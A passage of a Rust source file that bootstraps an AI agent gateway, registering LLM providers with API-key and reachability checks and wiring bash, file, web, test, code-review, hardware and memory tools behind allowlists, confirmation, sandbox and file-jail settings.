use std::sync::Arc;

use garraia_agents::tools::Tool;
use garraia_agents::{
    AgentRuntime, AnthropicProvider, BashTool, CodeReviewTool, CohereEmbeddingProvider,
    DeviceExecuteTool, DeviceListTool, DeviceReadTool, DeviceToolsConfig, EmbeddingProvider,
    FileJail, FileReadTool, FileWriteTool, ListDirTool, LlamaCppProvider, McpManager, NoisePolicy,
    OllamaEmbeddingProvider, OllamaProvider, OpenAiEmbeddingProvider, OpenAiProvider,
    RepoSearchTool, ResilientEmbeddingProvider, RunTestsTool, WebFetchTool, WebSearchTool,
};
// #1225: a policy de sandbox por tool, construida a partir de `agent.sandbox`.
use garraia_agents::sandbox::{SandboxBackend, SandboxMode, SandboxPolicy};
use garraia_config::defaults::DEFAULT_CLOUD_MODEL;
use garraia_config::{AppConfig, provider_key_env};
use garraia_db::MemoryStore;
use garraia_hardware::automations::{EngineConfig, TetoRisco};
use garraia_hardware::{
    AutomationEngine, AutomationStore, DeviceRegistry, DeviceStateStore, HaAdapterConfig,
    HaAdapterManager, HardwareEventBus, MqttAdapterConfig, MqttAdapterManager, carregar_automacoes,
};
use tracing::{info, warn};

mod channels;
mod config;
mod discord;
mod google_chat;
#[cfg(target_os = "macos")]
mod imessage;
mod irc;
mod line;
mod matrix;
mod openclaw;
mod signal;
mod slack;
mod teams;
mod telegram;
mod whatsapp;
mod whatsapp_linked;

// Slice 10.a (GAR-440): path resolvers and API-key precedence chain extracted
// to `bootstrap::config`. Re-exported at this level so external paths
// `crate::bootstrap::default_vault_path` and `crate::bootstrap::resolve_api_key`
// stay valid (consumed by `admin::handlers`, `router`, `state`).
pub(crate) use config::{default_vault_path, resolve_api_key};

// Slice 10.b (GAR-476): channel registry orchestrator extracted to `bootstrap::channels`.
pub use channels::build_channels;

// Slice 10.c (GAR-477): Discord wiring + command handler extracted to `bootstrap::discord`.
pub use discord::build_discord_channels;

// Slice 10.d (GAR-478): Slack wiring extracted to `bootstrap::slack`.
pub use slack::build_slack_channels;

// Slice 10.e (GAR-479): WhatsApp wiring extracted to `bootstrap::whatsapp`.
pub use whatsapp::build_whatsapp_channels;

/// #1238 (fatia D): o canal PULL `whatsapp_linked` — WhatsApp por dispositivo
/// vinculado. Irmao do `whatsapp` acima (Cloud API) e disjunto dele: chave de
/// config propria, transporte proprio (bridge Node/Baileys por NDJSON) e um
/// modelo de ameaca proprio, porque a mensagem vem de qualquer pessoa que
/// conheca o numero pessoal do operador.
pub use whatsapp_linked::{
    CONFIG_KEY as WHATSAPP_LINKED_CONFIG_KEY, LinkedPaths, WhatsAppLinkedRuntime,
    health as whatsapp_linked_health, spawn_whatsapp_linked,
};

/// #1050: o canal Google Chat. Canal push, como o WhatsApp — o `Vec<Arc<_>>`
/// vira estado da rota `/webhooks/google-chat`, nao entrada do
/// `ChannelRegistry`.
pub use google_chat::build_google_chat_channels;

/// #1050: o canal LINE, que tinha `impl Channel`, verificacao de assinatura
/// (#1051) e nenhuma rota. Canal push, como o WhatsApp: o `Vec<Arc<_>>` vira
/// estado da rota `/webhooks/line`, nao entrada do `ChannelRegistry`.
pub use line::build_line_channels;

/// #1050: o canal Microsoft Teams. Canal push, e o unico cujo destino de
/// saida vem do corpo da requisicao — ver `bootstrap::teams` e
/// `garraia_channels::teams::auth`.
pub use teams::build_teams_channels;

// Slice 10.f (GAR-480): iMessage wiring extracted to `bootstrap::imessage` (macOS-only).
#[cfg(target_os = "macos")]
pub use imessage::build_imessage_channels;

/// #1050: o canal IRC, que tinha `impl Channel` e nenhum call-site.
pub use irc::build_irc_channels;

/// #1050: o canal Matrix, que tinha `impl Channel` e sync loop e nenhum call-site.
pub use matrix::build_matrix_channels;

/// #1050: le a config do bridge OpenClaw, que ate agora ninguem lia.
pub use openclaw::{build_openclaw_config, spawn_openclaw_router};

/// #1050: o canal Signal, que tinha `impl Channel` e guard de URL e nenhum call-site.
pub use signal::build_signal_channels;

// Slice 10.g (GAR-691): Telegram wiring + voice handler extracted to `bootstrap::telegram`.
pub use telegram::build_telegram_channels;

const KEY_ENV_VAR_OPENAI: &str = "OPENAI_API_KEY";

/// Um endpoint OpenAI-compativel proprio (LM Studio, vLLM, um gateway interno)
/// nao pede credencial; `api.openai.com` pede. Sem essa distincao o bootstrap
/// mandava o literal "no-key" para os dois casos.
fn is_self_hosted_openai_endpoint(base_url: Option<&str>) -> bool {
    match base_url {
        // Sem `base_url`, o provider assume https://api.openai.com.
        None => false,
        Some(url) => !url.contains("api.openai.com"),
    }
}

/// Pergunta ao provider de embeddings se ele esta de pe, e avisa se nao
/// estiver (#951).
///
/// `health_check()` existia no trait desde sempre e **nunca era chamado**:
/// o boot logava "configured ollama embedding provider" e seguia, mesmo com
/// o Ollama desligado. O operador so descobria quando o recall ja tinha
/// degradado — e, ate o #948, nem entao, porque o erro era engolido.
///
/// Avisa, nao derruba o boot: memoria semantica e um recurso opcional do
/// gateway, e recusar subir por causa dela deixaria o usuario sem chat
/// nenhum por um problema que a reindexacao (#953) conserta depois.
pub async fn warn_if_embeddings_unhealthy(runtime: &AgentRuntime) {
    let Some(provider) = runtime.embedding_provider() else {
        return;
    };

    match provider.health_check().await {
        Ok(true) => {
            info!(
                "embedding provider '{}' (modelo '{}') respondeu ao health check",
                provider.provider_id(),
                provider.model()
            );
        }
        Ok(false) => {
            warn!(
                "embedding provider '{}' (modelo '{}') respondeu, mas se declarou fora: \
                 memorias novas vao nascer sem vetor e o recall cai para o caminho \
                 textual ate ele voltar. Depois de restaurar o servico, reindexe as \
                 entradas sem embedding (#953).",
                provider.provider_id(),
                provider.model()
            );
        }
        // A causa entra no log: o corpo da resposta de erro ja e sanitizado na
        // origem (`sanitize_error_body`), entao dizer o motivo aqui nao arrisca
        // vazar credencial — e sem ele o operador so sabe que "nao respondeu".
        Err(e) => {
            warn!(
                "embedding provider '{}' (modelo '{}') NAO respondeu ao health check: \
                 memorias novas vao nascer sem vetor e o recall cai para o caminho \
                 textual ate ele voltar. Depois de restaurar o servico, reindexe as \
                 entradas sem embedding (#953). Causa: {e}",
                provider.provider_id(),
                provider.model()
            );
        }
    }
}

/// #1180 — map `agent.default_provider` onto an id the runtime actually
/// knows, or `None` when nothing matches.
///
/// The two namespaces do not line up on their own. `config.llm` is keyed by
/// an operator-chosen *name* (`main`, `nuvem`, `openrouter`…), while a
/// registered provider answers `provider_id()` — usually its *type*
/// (`anthropic`, `ollama`, `openrouter`…). A config that says
/// `llm.main.provider: openrouter` + `agent.default_provider: main` is
/// perfectly valid and would find nothing under the literal key, so fall
/// back to the provider type behind that key before giving up.
///
/// Returns `None` (caller warns and keeps the current default) rather than
/// panicking: a default naming a provider that was skipped for want of an
/// API key must not take the whole gateway down at boot.
fn resolve_registered_provider_id(
    runtime: &AgentRuntime,
    config: &AppConfig,
    default_key: &str,
) -> Option<String> {
    let registered = runtime.provider_ids();
    if registered.iter().any(|p| p == default_key) {
        return Some(default_key.to_string());
    }
    let kind = config.llm.get(default_key)?.provider.as_str();
    registered
        .iter()
        .find(|p| p.as_str() == kind)
        .map(|p| p.to_string())
}

/// Build a fully-configured `AgentRuntime` from the application config.
pub fn build_agent_runtime(config: &AppConfig) -> AgentRuntime {
    let mut runtime = AgentRuntime::new();
    let mut unreachable_local_providers: Vec<String> = Vec::new();

    // Plan 0250 (GAR-771): if the vault is locked, tell the operator clearly and
    // early — before the "no API key" warnings that are the *symptom*.
    config::warn_if_vault_locked();

    let llm_client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(
            config.timeouts.llm.default_secs,
        ))
        .build()
        .unwrap_or_default();

    // --- LLM Providers ---
    for (name, llm_config) in &config.llm {
        let provider_type = llm_config.provider.as_str();

        // One table lookup and one precedence walk for every provider, rather
        // than the same three lines duplicated into fifteen match arms. The
        // table itself lives in `garraia_config::provider_keys` so that
        // `garraia config check` and `/health` answer "does this provider have
        // a key?" exactly the way the boot path does.
        let key_env = provider_key_env(provider_type);
        let resolved =
            key_env.and_then(|var| resolve_api_key(llm_config.api_key.as_deref(), var, var));

        // Central fail-fast. The old per-arm message said only "set api_key in
        // config or <VAR> env var", which omitted the vault — the very place
        // `garraia init` used to put the key by default, leaving operators
        // staring at "no API key" while the key sat encrypted on disk.
        if let Some(var) = key_env
            && resolved.is_none()
        {
            warn!(
                "skipping {provider_type} provider {name}: no API key. Fix it in any one of \
                 three ways — set `llm.{name}.api_key` in config.yml, export {var}, or \
                 unlock the credential vault by exporting {vault_env}.",
                vault_env = garraia_config::provider_keys::VAULT_PASSPHRASE_ENV
            );
            continue;
        }

        // Past the guard, keyed providers are guaranteed to have resolved a
        // key; keyless ones (`ollama`, `echo`) never had one to resolve, and
        // ignore this binding.
        let api_key = resolved.unwrap_or_default();

        match provider_type {
            "anthropic" => {
                let provider = AnthropicProvider::new(
                    api_key,
                    llm_config.model.clone(),
                    llm_config.base_url.clone(),
                )
                .with_client(llm_client.clone());
                runtime.register_provider(Arc::new(provider));
                info!("configured anthropic provider: {name}");
            }
            "openai" => {
                // Health check for local OpenAI-compatible providers (LM Studio, vLLM, etc.)
                if let Some(ref base_url) = llm_config.base_url
                    && (base_url.contains("localhost") || base_url.contains("127.0.0.1"))
                {
                    let addr = base_url
                        .trim_start_matches("http://")
                        .trim_start_matches("https://")
                        .split('/')
                        .next()
                        .unwrap_or("localhost:1234");
                    let sock_addr = if addr.contains(':') {
                        addr.to_string()
                    } else {
                        format!("{}:1234", addr)
                    };
                    match std::net::TcpStream::connect_timeout(
                        &sock_addr
                            .parse()
                            .unwrap_or_else(|_| std::net::SocketAddr::from(([127, 0, 0, 1], 1234))),
                        std::time::Duration::from_secs(2),
                    ) {
                        Ok(_) => {
                            info!("Local OpenAI provider '{name}' reachable at {base_url}");
                        }
                        Err(e) => {
                            warn!(
                                "Local OpenAI provider '{name}' not reachable at {base_url} \
                                 ({}). Provider registered but may fail. \
                                 Start the local server or switch default_provider in config.",
                                e
                            );
                            unreachable_local_providers.push(name.clone());
                        }
                    }
                }

                let provider = OpenAiProvider::new(
                    api_key,
                    llm_config.model.clone(),
                    llm_config.base_url.clone(),
                )
                .with_client(llm_client.clone());
                runtime.register_provider(Arc::new(provider));
                info!("configured openai provider: {name}");
            }
            "ollama" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .unwrap_or_else(|| "http://localhost:11434".to_string());

                // Health check: quick TCP connectivity test to Ollama
                let addr = base_url
                    .trim_start_matches("http://")
                    .trim_start_matches("https://")
                    .trim_end_matches('/');
                let sock_addr = if addr.contains(':') {
                    addr.to_string()
                } else {
                    format!("{}:11434", addr)
                };
                match std::net::TcpStream::connect_timeout(
                    &sock_addr
                        .parse()
                        .unwrap_or_else(|_| std::net::SocketAddr::from(([127, 0, 0, 1], 11434))),
                    std::time::Duration::from_secs(2),
                ) {
                    Ok(_) => {
                        info!(
                            "✅ Ollama reachable at {} — registering provider: {name}",
                            base_url
                        );
                    }
                    Err(e) => {
                        warn!(
                            "⚠️  Ollama not reachable at {} — provider registered but will fail until Ollama starts. \
                             Error: {}. Run: ollama serve",
                            base_url, e
                        );
                    }
                }

                let provider =
                    OllamaProvider::new(llm_config.model.clone(), llm_config.base_url.clone())
                        .with_client(llm_client.clone());
                runtime.register_provider(Arc::new(provider));
                info!("configured ollama provider: {name}");
            }
            // Keyless local daemon, mirroring the ollama arm: llama-server
            // exposes the OpenAI-compatible API on its documented default
            // port 8080 (ADR 0016 — Garra Mobile local-first).
            "llamacpp" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .unwrap_or_else(|| "http://localhost:8080".to_string());

                let addr = base_url
                    .trim_start_matches("http://")
                    .trim_start_matches("https://")
                    .trim_end_matches('/');
                let sock_addr = if addr.contains(':') {
                    addr.to_string()
                } else {
                    format!("{}:8080", addr)
                };
                match std::net::TcpStream::connect_timeout(
                    &sock_addr
                        .parse()
                        .unwrap_or_else(|_| std::net::SocketAddr::from(([127, 0, 0, 1], 8080))),
                    std::time::Duration::from_secs(2),
                ) {
                    Ok(_) => {
                        info!(
                            "✅ llama.cpp server reachable at {} — registering provider: {name}",
                            base_url
                        );
                    }
                    Err(e) => {
                        warn!(
                            "⚠️  llama.cpp server not reachable at {} — provider registered but \
                             will fail until llama-server starts. Error: {}. \
                             Run: llama-server -m <model>",
                            base_url, e
                        );
                    }
                }

                let provider = LlamaCppProvider::new(
                    llm_config.model.clone(),
                    llm_config.base_url.clone(),
                    None,
                );
                runtime.register_provider(Arc::new(provider));
                info!("configured llamacpp provider: {name}");
            }
            "sansa" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.sansaml.com".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("sansa-auto".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("sansa");
                runtime.register_provider(Arc::new(provider));
                info!("configured sansa provider: {name}");
            }
            "deepseek" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.deepseek.com".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("deepseek-chat".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("deepseek");
                runtime.register_provider(Arc::new(provider));
                info!("configured deepseek provider: {name}");
            }
            "mistral" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.mistral.ai".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("mistral-large-latest".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("mistral");
                runtime.register_provider(Arc::new(provider));
                info!("configured mistral provider: {name}");
            }
            "gemini" => {
                let base_url = llm_config.base_url.clone().or_else(|| {
                    Some("https://generativelanguage.googleapis.com/v1beta/openai/".to_string())
                });
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("gemini-2.5-flash".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("gemini");
                runtime.register_provider(Arc::new(provider));
                info!("configured gemini provider: {name}");
            }
            "falcon" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.ai71.ai/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("tiiuae/falcon-180b-chat".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("falcon");
                runtime.register_provider(Arc::new(provider));
                info!("configured falcon provider: {name}");
            }
            "jais" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.core42.ai/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("jais-adapted-70b-chat".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("jais");
                runtime.register_provider(Arc::new(provider));
                info!("configured jais provider: {name}");
            }
            "qwen" => {
                let base_url = llm_config.base_url.clone().or_else(|| {
                    Some("https://dashscope-intl.aliyuncs.com/compatible-mode/v1".to_string())
                });
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("qwen-plus".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("qwen");
                runtime.register_provider(Arc::new(provider));
                info!("configured qwen provider: {name}");
            }
            "yi" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.lingyiwanwu.com/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("yi-large".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("yi");
                runtime.register_provider(Arc::new(provider));
                info!("configured yi provider: {name}");
            }
            "cohere" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.cohere.com/compatibility/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("command-r-plus".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("cohere");
                runtime.register_provider(Arc::new(provider));
                info!("configured cohere provider: {name}");
            }
            "minimax" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.minimaxi.chat/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("MiniMax-Text-01".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("minimax");
                runtime.register_provider(Arc::new(provider));
                info!("configured minimax provider: {name}");
            }
            "moonshot" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://api.moonshot.cn/v1".to_string()));
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some("kimi-k2-0711-preview".to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("moonshot");
                runtime.register_provider(Arc::new(provider));
                info!("configured moonshot provider: {name}");
            }
            "openrouter" => {
                let base_url = llm_config
                    .base_url
                    .clone()
                    .or_else(|| Some("https://openrouter.ai/api/v1".to_string()));
                // #1180: an `openrouter` block with no explicit `model:` used
                // to land on a hardcoded `openai/gpt-4o` here — a fifth answer
                // to "which model runs when nobody chose one?", invisible to
                // the CLI's lock. Both crates now read the same constant.
                let model = llm_config
                    .model
                    .clone()
                    .or_else(|| Some(DEFAULT_CLOUD_MODEL.to_string()));
                let provider = OpenAiProvider::new(api_key, model, base_url)
                    .with_client(llm_client.clone())
                    .with_name("openrouter");
                runtime.register_provider(Arc::new(provider));
                info!("configured openrouter provider: {name}");
            }
            // Plan 0051 (GAR-444): deterministic echo provider for dev + CI
            // smoke tests. Gated by `dev-echo-provider` feature on
            // `garraia-gateway` (forwarded to `garraia-agents`). Default OFF —
            // the arm is not compiled in production release builds.
            #[cfg(feature = "dev-echo-provider")]
            "echo" => {
                let provider = garraia_agents::EchoProvider::new(llm_config.model.clone());
                runtime.register_provider(Arc::new(provider));
                info!("configured echo provider: {name} (dev-echo-provider feature)");
            }
            other => {
                warn!("unknown LLM provider type: {other}, skipping {name}");
            }
        }
    }

    // --- #1180: the configured default decides, not `HashMap` iteration ---
    // `register_provider` promotes the FIRST provider it sees to default, and
    // the loop above walks `config.llm`, a `HashMap` — so on any box with two
    // providers configured (the shipped Desktop config has exactly two:
    // `openrouter` + `ollama`) the effective default was whichever one the
    // hasher happened to yield first. "A fresh install boots on OpenRouter"
    // was therefore a coin flip, not a guarantee. Applying
    // `agent.default_provider` here makes it deterministic.
    //
    // Placed BEFORE the unreachable-provider auto-fallback below on purpose:
    // that block may override this decision — but only in one narrow case.
    // `unreachable_local_providers` is filled solely by the `"openai"` arm
    // above, i.e. an OpenAI-compatible endpoint (LM Studio, vLLM, …) whose
    // `base_url` points at localhost/127.0.0.1 and whose TCP probe failed.
    // The `ollama` and `llamacpp` arms probe too, but only log: a local
    // daemon of those kinds that nobody started is NOT pushed there, so when
    // one of them is the configured default the decision above stands and
    // the first request fails instead of auto-switching.
    if let Some(default_key) = config.agent.default_provider.as_deref() {
        match resolve_registered_provider_id(&runtime, config, default_key) {
            Some(id) => {
                if runtime.set_default_provider_id(&id) {
                    info!("default LLM provider set from agent.default_provider: {id}");
                } else {
                    // Unreachable in practice — `resolve_registered_provider_id`
                    // only ever returns an id it just saw in `provider_ids()`.
                    warn!("could not apply agent.default_provider '{default_key}'");
                }
            }
            None => warn!(
                "agent.default_provider '{default_key}' is not a registered provider \
                 (missing API key, unknown provider type, or absent from the `llm:` map) — \
                 keeping '{current}'. Fix the key or the `llm.{default_key}` block.",
                current = runtime
                    .default_provider_id()
                    .unwrap_or_else(|| "<none>".to_string())
            ),
        }
    }

    // --- Provider Status Summary ---
    {
        let providers = runtime.provider_ids();
        let configured_count = config.llm.len();
        let active_count = providers.len();
        let skipped_count = configured_count.saturating_sub(active_count);

        info!("╔══════════════════════════════════════╗");
        info!("║       Provider Status Summary        ║");
        info!("╠══════════════════════════════════════╣");
        for (name, llm_config) in &config.llm {
            let provider_type = &llm_config.provider;
            let is_active = providers.iter().any(|p| p == name || p == provider_type);
            if is_active {
                info!("║  ✅ {:<15} ({:<12}) ║", name, provider_type);
            } else {
                info!("║  ⚠️  {:<15} DISABLED       ║", name);
            }
        }
        info!("╠══════════════════════════════════════╣");
        info!(
            "║  Total: {} active / {} configured     ║",
            active_count, configured_count
        );
        if skipped_count > 0 {
            info!("║  ⚠️  {} provider(s) skipped          ║", skipped_count);
        }
        info!("╚══════════════════════════════════════╝");
    }

    // --- Auto-fallback: if default_provider is an unreachable local
    // OpenAI-compatible endpoint (the only kind the `"openai"` arm records
    // in `unreachable_local_providers`), try another ---
    if let Some(ref default_id) = config.agent.default_provider
        && unreachable_local_providers.iter().any(|p| p == default_id)
    {
        let providers = runtime.provider_ids();
        let fallback = providers
            .iter()
            .find(|p| !unreachable_local_providers.contains(p));
        if let Some(fallback_id) = fallback {
            warn!(
                "Default provider '{}' is unreachable — auto-switching to '{}'",
                default_id, fallback_id
            );
            runtime.set_default_provider_id(fallback_id);
        } else {
            warn!(
                "Default provider '{}' is unreachable and no fallback available. \
                 Start the local server or add a cloud provider to config.",
                default_id
            );
        }
    }

    // --- Tools ---
    // GAR-187: use confirmation-enabled BashTool when config.agent.tool_confirmation_enabled
    // #1105: a allowlist do operador vale nos dois caminhos — com ou sem canal
    // de confirmacao. E ela que destrava o caso reportado (um CLI de outro
    // agente instalado pelo proprio dono) sem abrir o tier risky inteiro.
    let mut bash_tool = if config.agent.tool_confirmation_enabled {
        BashTool::new_with_confirmation(None)
    } else {
        BashTool::new(None)
    }
    .with_allowlist(config.agent.bash_allowlist.clone());
    // #1225: `agent.sandbox` finalmente chega ao tool. Aplicado DEPOIS da
    // allowlist de proposito — ordem de construcao inalterada, e a policy e
    // camada adicional, nao substituta do safety gate. Secao ausente =>
    // `SandboxPolicy::default()` (Off) => comportamento identico ao de antes.
    bash_tool.set_sandbox_policy(sandbox_policy_from(&config.agent.sandbox));
    runtime.register_tool(Box::new(bash_tool));
    // #1244: as file tools do gateway recebem um jail obrigatorio. As raizes
    // sao `agent.file_roots` (vazio por padrao) mais o `working_dir` da
    // sessao, resolvido por chamada. Sem nenhuma das duas, elas negam tudo —
    // e um gateway na porta 3888 atende pedido que veio do Telegram.
    let file_jail = FileJail::from_config_roots(&config.agent.file_roots);
    if file_jail.has_no_configured_roots() {
        info!(
            "file tools confinadas ao working_dir da sessao \
             (agent.file_roots vazio); sessao sem working_dir nao le nem escreve"
        );
    } else {
        info!(
            "file tools confinadas a {} raiz(es) de agent.file_roots + working_dir da sessao: {}",
            file_jail.roots().len(),
            file_jail
                .roots()
                .iter()
                .map(|r| r.display().to_string())
                .collect::<Vec<_>>()
                .join(", ")
        );
    }
    // #1244: contar raizes nao diz **quais**, e `GARRAIA_FILE_ROOTS=/` nunca
    // passa pelo `config check`. Uma raiz que resolve para `/` ou para o
    // `$HOME` e o jail desligado — nao e erro (a decisao e do operador), mas
    // nao pode ser silencioso, senao a saida mais comoda para um jail apertado
    // e tambem a que desfaz a #1244 sem deixar rastro.
    for (root, motivo) in file_jail.raizes_perigosas() {
        warn!(
            root = %root.display(),
            "raiz de file tool perigosa ({motivo}): as file tools do agente alcancam tudo \
             debaixo dela. Confira agent.file_roots e a env GARRAIA_FILE_ROOTS (issue #1244)"
        );
    }
    runtime.register_tool(Box::new(FileReadTool::new(file_jail.clone())));
    runtime.register_tool(Box::new(FileWriteTool::new(file_jail.clone())));
    runtime.register_tool(Box::new(WebFetchTool::new(None)));

    // #1033 / #1035: estas tres existiam, com schema e testes verdes, e nunca
    // entraram no runtime — o unico `new()` delas no repo era dentro dos
    // proprios modulos de teste. As whitelists dos modos (`search`, `debug`,
    // `review`) ja anunciavam `list_dir` e `repo_search`; o modelo via a
    // promessa na policy e nao recebia a ferramenta.
    runtime.register_tool(Box::new(ListDirTool::new(file_jail, None)));
    runtime.register_tool(Box::new(RepoSearchTool::new(None, None)));
    // `run_tests` executa o que o projeto mandar (`npm test` roda o script do
    // package.json), entao respeita a mesma chave de confirmacao do bash.
    let run_tests = if config.agent.tool_confirmation_enabled {
        RunTestsTool::new_with_confirmation(None)
    } else {
        RunTestsTool::new(None)
    };
    runtime.register_tool(Box::new(run_tests));

    // ADR 0020 / epic #1124: as tools de hardware (device_list/read/execute).
    // O registry nasce vazio — nenhum adaptador físico existe ainda (#1126/
    // #1127/#1130) e o boot de adapters via config é a #1128. Com registry
    // vazio, `device_list` responde "Nenhum dispositivo registrado" e nada
    // de hardware roda: o fail-closed é o estado default do deploy.
    // `device_execute` honra `tool_confirmation_enabled` (mesma chave do
    // bash): sem canal, R3/R4/R5 são fail-closed BLOCKED dentro da tool.
    let device_registry = Arc::new(DeviceRegistry::new());
    // #1126/#1127: com `hardware.mqtt` ou `hardware.home_assistant`
    // configurado, os adapters sobem aqui — descoberta (manifestos retained
    // / `/api/states`), presenca no store compartilhado e eventos de estado.
    // Sem secao, o registry segue vazio: fail-closed, o estado default do
    // deploy.
    let device_state = spawn_hardware_adapters(config, device_registry.clone());
    let device_config = Arc::new(match device_state {
        Some(state) => DeviceToolsConfig::new(device_registry).com_estado(state),
        None => DeviceToolsConfig::new(device_registry),
    });
    runtime.register_tool(Box::new(DeviceListTool::new(device_config.clone())));
    runtime.register_tool(Box::new(DeviceReadTool::new(device_config.clone())));
    let device_execute = if config.agent.tool_confirmation_enabled {
        DeviceExecuteTool::new(device_config)
    } else {
        DeviceExecuteTool::new_without_confirmation(device_config)
    };
    runtime.register_tool(Box::new(device_execute));

    // `code_review` roda um segundo LLM por dentro, entao precisa de um
    // provider resolvido aqui, e nao de `None`. Usa o default do boot: se o
    // operador trocar o default depois, a revisao continua no provider de
    // quando o gateway subiu — aceitavel para uma ferramenta auxiliar, e
    // dito aqui para ninguem procurar o porque.
    match runtime.default_provider_id() {
        Some(pid) => match runtime
            .get_provider(&pid)
            .and_then(|p| p.configured_model().map(str::to_string).map(|m| (p, m)))
        {
            Some((provider, model)) => {
                runtime.register_tool(Box::new(CodeReviewTool::new(provider, model, None)));
            }
            None => info!(
                "code_review not registered: default provider '{pid}' has no configured model"
            ),
        },
        None => info!("code_review not registered: no default provider at boot"),
    }

    // Web search (#1034): Brave (chave) ou SearXNG (URL, sem chave). Sem a
    // secao `agent.web_search`, o comportamento e o de sempre — so com chave
    // do Brave. `GARRAIA_SEARXNG_URL` e o equivalente da env para a URL.
    let brave_config_key = config.llm.get("brave").and_then(|c| c.api_key.clone());
    let brave_key = resolve_api_key(
        brave_config_key.as_deref(),
        "BRAVE_API_KEY",
        "BRAVE_API_KEY",
    );
    let searxng_url = config
        .agent
        .web_search
        .searxng_url
        .clone()
        .or_else(|| std::env::var("GARRAIA_SEARXNG_URL").ok())
        .filter(|u| !u.trim().is_empty());
    match select_web_search_backend(config.agent.web_search.backend, brave_key, searxng_url) {
        Some(backend) => {
            info!(backend = backend.name(), "web_search registrada");
            runtime.register_tool(Box::new(WebSearchTool::with_backend(backend)));
        }
        None if config.agent.web_search.backend.is_some() => warn!(
            "agent.web_search.backend configurado sem a chave/URL que ele precisa; \
             web_search fica de fora (veja `garra config check`)"
        ),
        None => {}
    }

    // --- Memory ---
    if config.memory.enabled {
        let data_dir = config.resolved_data_dir();

        if let Err(e) = std::fs::create_dir_all(&data_dir) {
            warn!("failed to create data directory: {e}");
        }

        // Mesma resolucao que a CLI usa (`garra memory`) — ver
        // `AppConfig::memory_db_path`.
        let memory_db_path = config.memory_db_path();
        match MemoryStore::open(&memory_db_path) {
            Ok(store) => {
                let store = Arc::new(store);
                runtime.set_memory_provider(store);
                info!("memory store opened at {}", memory_db_path.display());

                // Attach embedding provider if configured. A construcao mora
                // em `build_embedding_provider` para a CLI reusar o mesmo
                // provider sem subir um runtime (#953).
                if let Some(provider) = build_embedding_provider(config) {
                    runtime.set_embedding_provider(provider);
                }
            }
            Err(e) => {
                warn!("failed to open memory store: {e}");
            }
        }
    }

    // --- Agent Config ---
    if let Some(prompt) = &config.agent.system_prompt {
        runtime.set_system_prompt(prompt.clone());
    }
    // Plan 0250 (GAR-771): wire the default persona. When no `system_prompt` is
    // configured, Garra speaks with the warm "friendly" voice by default; set
    // `agent.persona = "neutral"` to opt out.
    runtime.set_persona_mode(match config.agent.persona {
        garraia_config::model::PersonaMode::Friendly => garraia_agents::PersonaMode::Friendly,
        garraia_config::model::PersonaMode::Neutral => garraia_agents::PersonaMode::Neutral,
    });
    if let Some(lang) = &config.agent.persona_lang {
        runtime.set_persona_lang(garraia_agents::Lang::from_code(lang));
    }
    if let Some(max_tokens) = config.agent.max_tokens {
        runtime.set_max_tokens(max_tokens);
    }
    if let Some(max_tool_calls) = config.agent.max_tool_calls {
        runtime.set_max_tool_calls(max_tool_calls);
    }
    // GAR-210: wire fallback provider list from config
    if !config.agent.fallback_providers.is_empty() {
        runtime.set_fallback_providers(config.agent.fallback_providers.clone());
        info!(
            "provider fallback order: {:?}",
            config.agent.fallback_providers
        );
    }
    // GAR-208: wire context window / summarization policy
    {
        use garraia_agents::context_policy::ContextPolicy;
        let policy = ContextPolicy::new(
            config.agent.max_history_messages,
            config.agent.summarize_threshold,
        );
        if policy.max_history_messages.is_some() || policy.summarize_threshold.is_some() {
            info!(
                window = ?policy.max_history_messages,
                threshold = ?policy.summarize_threshold,
                summarizer_model = ?config.agent.summarizer_model,
                "context policy configured"
            );
        }
        runtime.set_context_policy(policy);
    }

    // #952: o que nao merece vetor na ingestao.
    {
        let policy = noise_policy_from_config(config);
        if policy.is_enabled() {
            info!(
